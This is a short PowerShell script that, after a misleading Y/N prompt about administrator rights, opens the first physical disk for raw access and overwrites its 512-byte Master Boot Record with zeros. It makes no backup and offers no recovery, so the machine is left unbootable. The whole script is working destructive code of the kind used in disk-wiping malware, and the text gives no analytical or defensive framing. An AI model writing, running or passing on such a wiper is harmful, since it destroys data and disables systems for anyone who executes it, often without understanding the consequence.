$MBR_SIZE = 512

# Prompt the user if they wish to run the script with administrative privileges
$runAsAdmin = Read-Host "This script modifies the Master Boot Record (MBR) which requires administrative privileges. Do you want to run this script as an administrator? (Y/N)"

if ($runAsAdmin -ne "Y" -and $runAsAdmin -ne "y") {
    Write-Host "Script execution canceled. Run the script as an administrator if you want to modify the MBR."
    Exit
}

try {
    $MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", 'Open', 'ReadWrite', 'None')

    $mbrData = New-Object byte[] $MBR_SIZE

    $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
    Start-Sleep -Milliseconds 5000
    $MasterBootRecord.Close()
}
catch {
    # Handle the exception if needed
    Write-Host "An error occurred: $_"
    if ($MasterBootRecord -ne $null) {
        $MasterBootRecord.Close()
    }
}
